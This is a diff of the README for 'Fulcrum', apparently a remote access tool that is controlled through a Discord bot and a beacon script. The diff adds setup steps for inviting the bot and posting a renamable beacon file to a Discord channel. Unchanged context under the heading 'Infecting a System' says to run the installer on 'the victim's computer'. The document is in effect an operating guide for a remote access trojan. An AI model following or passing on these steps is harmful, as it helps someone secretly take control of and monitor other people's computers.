@@ -7,11 +7,14 @@ Fulcrum is a remote monitoring and access software with a Fulcrum beacon running
 ### Setup
 - If you want the installer to work without a `.env` file, you will need to modify the code and add the token directly. Add the token at the start of both the `fulcrum_beacon.py` file and the `installer.py` file.
 - Create your own Discord bot at [Discord Developer Portal](https://discord.com/developers/applications).
-- Set up a Discord server with the following structure and invite the bot.
+- Set up a Discord server with the following structure
 
 ![image](https://github.com/user-attachments/assets/c5ecaac9-9e8d-4ba2-b3e6-b98066d3c38b)
 
+- invite your bot to the server
+- send your `fulcrum_beacon.py` file (can be renamed) into the `fulcrum-beacon` channel
 
+  
 ### Infecting a System
 - Execute the `installer.py` file on the victim's computer.
   - If you did not modify the code, you will need a `.env` file with your bot token:
